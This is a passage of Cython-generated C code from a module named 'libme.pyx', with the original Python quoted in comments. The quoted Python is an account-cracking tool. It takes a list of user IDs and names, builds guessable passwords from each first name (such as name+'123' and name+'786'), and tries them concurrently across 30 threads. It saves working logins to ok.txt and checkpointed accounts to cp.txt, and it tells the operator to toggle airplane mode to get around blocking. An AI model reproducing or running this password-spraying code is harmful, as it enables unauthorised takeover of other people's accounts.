      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_empty_tuple, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 785, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 785, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 785, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_17 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_17)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_17);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_4 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 785, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __pyx_t_4;
      __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_1, &__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_2);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_10;
            __pyx_t_10 = 0;

            /* "libme.pyx":786
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 786, __pyx_L37_error)

            /* "libme.pyx":787
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 787, __pyx_L37_error)

            /* "libme.pyx":788
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 788, __pyx_L37_error)

            /* "libme.pyx":789
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 789, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (likely(PyList_CheckExact(__pyx_t_10)) || PyTuple_CheckExact(__pyx_t_10)) {
              __pyx_t_5 = __pyx_t_10; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 789, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 789, __pyx_L37_error)
            }
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 789, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 789, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 789, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 789, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                }
              } else {
                __pyx_t_10 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_10)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 789, __pyx_L37_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_10);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":790
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:
 * 						uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 */
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 790, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_4);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_4, function);
                }
              }
              __pyx_t_10 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_17, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 790, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {
                PyObject* sequence = __pyx_t_10;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 790, __pyx_L37_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_4 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_4 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_17);
                #else
                __pyx_t_4 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 790, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_17 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 790, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                #endif
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 790, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_4 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_4)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_4);
                index = 1; __pyx_t_17 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_17)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_17);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 790, __pyx_L37_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L46_unpacking_done;
                __pyx_L45_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 790, __pyx_L37_error)
                __pyx_L46_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_4);
              __pyx_t_4 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":791
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]             # <<<<<<<<<<<<<<
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
              __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 791, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __pyx_t_4 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_17);
                if (likely(__pyx_t_4)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                  __Pyx_INCREF(__pyx_t_4);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_17, function);
                }
              }
              __pyx_t_10 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_4, __pyx_kp_s__43) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_kp_s__43);
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 791, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              __pyx_t_17 = __Pyx_GetItemInt(__pyx_t_10, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 791, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF_SET(__pyx_v_ft, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":792
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 792, __pyx_L37_error)
              __pyx_t_19 = ((__pyx_t_20 >= 6) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":793
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 793, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 793, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 793, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 793, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyList_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 793, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_6, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_6, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_6, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_6, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_6));
                __pyx_t_6 = 0;

                /* "libme.pyx":792
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":794
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 794, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 3) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 794, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 4) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 794, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 5) != 0);
              __pyx_t_19 = __pyx_t_13;
              __pyx_L48_bool_binop_done:;
              if (__pyx_t_19) {

                /* "libme.pyx":795
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 795, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 795, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 795, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 795, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_17 = PyList_New(5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 795, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_17, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_17, 1, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_17, 2, __pyx_t_9);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_17, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_17, 4, __pyx_t_10);
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __pyx_t_4 = 0;
                __pyx_t_10 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_17));
                __pyx_t_17 = 0;

                /* "libme.pyx":794
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":797
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __file__(self, uid, pwx):
 */
              /*else*/ {
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 797, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 797, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 797, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 797, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyList_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 797, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_6, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_6, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_6, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_6, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_6));
                __pyx_t_6 = 0;
              }
              __pyx_L47:;

              /* "libme.pyx":798
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)             # <<<<<<<<<<<<<<
 * 	def __file__(self, uid, pwx):
 * 		ua = random.choice([
 */
              __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 798, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_9);
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_file); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 798, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_10 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_9, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_4, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 798, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_4, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 798, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 798, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_10) {
                  __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_10); __pyx_t_10 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_4);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_INCREF(__pyx_v_pwx);
                __Pyx_GIVEREF(__pyx_v_pwx);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_v_pwx);
                __pyx_t_4 = 0;
                __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_17, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 798, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":789
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":785
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
          }
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L42_try_end;
          __pyx_L37_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__mennn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_9) < 0) __PYX_ERR(0, 785, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_6, __pyx_t_9); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 785, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 785, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_19 < 0) __PYX_ERR(0, 785, __pyx_L39_except_error)
            __pyx_t_13 = ((!(__pyx_t_19 != 0)) != 0);
            if (__pyx_t_13) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_6);
              __Pyx_XGIVEREF(__pyx_t_9);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_6, __pyx_t_9);
              __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_9 = 0; 
              __PYX_ERR(0, 785, __pyx_L39_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
